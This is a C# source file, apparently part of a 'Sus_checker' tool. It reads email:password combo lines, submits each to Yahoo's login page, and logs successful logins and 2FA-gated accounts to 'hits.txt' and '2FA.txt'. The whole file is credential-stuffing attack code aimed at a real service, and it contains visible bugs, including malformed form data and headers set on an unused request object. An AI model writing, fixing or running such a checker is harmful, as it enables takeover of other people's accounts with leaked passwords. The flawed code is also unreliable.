using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.IO;
using System.Drawing;
using Colorful;
using Leaf.xNet;
using System.Linq;

namespace Sus_checker.modules
{
    internal class yahoocs
    {
        public static bool checkyahoo(string combo)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string email = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + email + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)HttpWebRequest.Create("https://login.yahoo.com/");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.Method = "Post";
                request2.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36";
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                httpRequest.AddHeader("bucket", "mbr-phoenix-gpst");
                httpRequest.Referer = "https://login.yahoo.com/";

                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();

                if (html.Contains("Log out"))
                {
                    Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("Manage account"))
                {
                    Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("https://login.yahoo.com/account/logout"))
                {
                    Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("For your safety, choose a method below to verify that"))
                {
                    Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/2FA.txt", combo);
                    return true;
                }
                if (html.Contains("Add a phone number and email"))
                {
                    Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/2FA.txt", combo);
                    return true;
                }
                else
                {
                    Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
